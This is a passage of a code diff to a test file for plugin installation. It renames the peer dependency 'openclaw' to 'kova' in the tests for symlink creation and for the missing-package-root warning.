     const { result: first } = await installFromDirWithWarnings({ pluginDir, extensionsDir });
@@ -2711,15 +2711,15 @@ describe("linkOpenClawPeerDependencies (via installPluginFromDir)", () => {
     if (!second.ok) {
       return;
     }
-    const symlinkPath = path.join(second.targetDir, "node_modules", "openclaw");
+    const symlinkPath = path.join(second.targetDir, "node_modules", "kova");
     expect(fs.lstatSync(symlinkPath).isSymbolicLink()).toBe(true);
   });
 
-  it("warns and skips when resolveOpenClawPackageRootSync returns null", async () => {
+  it("warns and skips when resolveKovaPackageRootSync returns null", async () => {
     const { pluginDir, extensionsDir } = setupPluginInstallDirs();
     resolveRootMock.mockReturnValue(null);
 
-    writePluginWithPeerDeps(pluginDir, { openclaw: "*" });
+    writePluginWithPeerDeps(pluginDir, { kova: "*" });
 
     const { result, warnings } = await installFromDirWithWarnings({ pluginDir, extensionsDir });
 
